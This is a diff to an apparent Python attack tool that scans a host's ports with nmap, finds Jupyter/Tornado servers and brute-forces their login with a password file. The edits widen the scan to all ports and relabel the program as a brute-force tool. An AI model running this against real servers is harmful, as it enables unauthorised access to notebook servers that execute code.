@@ -33,13 +33,17 @@ from termcolor import colored
   
 def args():
 	
-	my_parser = argparse.ArgumentParser(description='Jupyter Scanning Program',
+	my_parser = argparse.ArgumentParser(description='Jupyter Scanning & Brute Force Program',
                                     epilog='Happy Hacking :)',
 									prog=__file__,
                                     usage='%(prog)s [options] ip')
 
-	my_parser.add_argument('-i', '--ip', dest='ip', action='store', required=True, help='IP of the host to scan & attack')
-	my_parser.add_argument('-p', '--password_file', dest='password_file', action='store', required=True, help='File with passwords for brute forcing...')
+	my_parser.add_argument('-i', '--ip', dest='ip', action='store',
+						    required=True, 
+							help='IP of the host to scan & attack')
+	my_parser.add_argument('-p', '--password_file', dest='password_file', 
+							action='store', required=True, 
+							help='File with passwords for brute forcing...')
 
 	return(my_parser.parse_args())
 
@@ -64,7 +68,6 @@ def brute_login(ip, port, pass_file):
 	if re.search('Jupyter', check_for_jupyter):
 	
 		if re.search('/login', browser.get_url()): # Testing to see if we are prompted for login
-			# We need to iterate over passwords
 			passwords=open(pass_file, "r")
 			pass_line = passwords.readlines()
 			for password in pass_line:
@@ -102,7 +105,7 @@ def main():
 	    print("Unexpected error:", sys.exc_info()[0])
 	    sys.exit(0)
 
-	nm.scan(ip, '6500')      # scan host for all ports
+	nm.scan(ip, '0-65535')      # scan host for all ports
 	# print(nm.command_line())    # get command line used for the scan
 	for port in nm[ip]['tcp']:
 		pattern = 'tornadoweb'
